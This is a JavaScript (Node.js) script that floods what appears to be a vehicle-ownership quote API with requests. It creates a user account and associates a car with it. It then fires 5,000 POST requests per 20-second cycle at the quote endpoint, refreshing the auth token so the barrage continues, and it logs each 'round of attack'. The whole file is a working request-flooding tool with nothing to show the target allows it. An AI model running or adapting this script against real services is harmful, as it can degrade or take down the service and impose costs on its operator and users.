const axios = require('axios');
const createUser = require('./createUser');
const refreshToken = require('./refreshToken');
const associateCar = require('./associateCar');
// num of request sent per cycle
const numOfRequests = 5000;
// number of seconds each cycle lasts
const cycleDurationInSeconds = 20;
// how many rounds per cycle
const roundsPerCycle = 2;
const milesPerYear = 3332;
const yearsToOwn = 10;
const { institutionId, carId, baseUrl } = require('../keys');

const attackApi = async () => {
	const newUser = await createUser(institutionId);
	let { token } = newUser;
	const { userId, emailAddress } = newUser.user;
	// links car with user, quotes fail without link
	await associateCar(token, userId);
	let requestsMade = 0;
	let roundsOfAttacks = 0;

	const manageTokenState = (timer, numOfRequests, token) => {
		let mutableTimer = roundsPerCycle;
		const attack = setInterval(async () => {
			if (mutableTimer > 0) {
				executeRequestLoop(numOfRequests, token);
				mutableTimer--;
			} else {
				console.log(`Number of requests so far: ${requestsMade}`);
				console.log('Refreshing token');
				// stops previous setInterval
				clearInterval(attack);
				// timer runs out, fetch new token, call recursively
				const refreshedToken = await refreshToken(emailAddress, userId, token);
				manageTokenState(roundsPerCycle, numOfRequests, refreshedToken.token);
			}
		}, cycleDurationInSeconds * 1000);
	};
	const executeRequestLoop = (requests, currentToken) => {
		while (requests > 0) {
			let options = {
				method: 'post',
				url: `${baseUrl}/${userId}/quote`,
				headers: {
					Authorization: currentToken,
					'Content-Type': 'application/json'
				},
				data: {
					carId,
					milesPerYear,
					yearsToOwn
				}
			};
			axios(options).catch(() => {});
			requests--;
			requestsMade++;
		}
		roundsOfAttacks++;
		console.log(`Round of Attack: ${roundsOfAttacks}`);
	};
	// runs once
	console.log('Beginning attack. \n');
	manageTokenState(roundsPerCycle, numOfRequests, token);
};

attackApi();
